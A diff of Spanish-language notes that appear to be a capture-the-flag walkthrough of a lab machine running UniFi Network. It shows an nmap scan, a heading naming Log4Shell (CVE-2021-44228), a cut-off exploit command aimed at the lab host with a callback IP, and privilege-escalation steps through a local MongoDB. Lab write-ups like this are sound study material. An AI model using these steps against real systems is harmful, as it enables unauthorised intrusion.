@@ -67,7 +67,7 @@ nmap -sCV -p22,6789,8080,8443,8843,8880 10.129.228.2 -oN target
 `6789, 8443, 8843, 8880` Estos todavia no sabemos para que son
 
 --------
-# Explotacion Unifi Network
+# CVE [[CVE-2021-44228]]
 
 Cuando entramos al puerto 8080 que dice que es un http, nos redirigue a esta pagina
 ![[Unified4.png]]
@@ -85,13 +85,15 @@ Ejecutamos el exploit ``python3 exploit.py -u https://10.129.228.2:8443 -i 10.10
 ---
 # Escalada de privilegios
 
+```
 ps aux | grep mongod
+```
 
 ![[Unified7.png]]
 
 Vemos que esta corriendo en el puerto 27117
 
-Nos conectamos con mongo --port 27117
+Nos conectamos con ``mongo --port 27117``
 ![[Unified8.png]]
 
 Para ver las bases de datos `show dbs` y despues usamos la base de datos "ace" que es la unica que tiene contenido por el peso con `use ace`
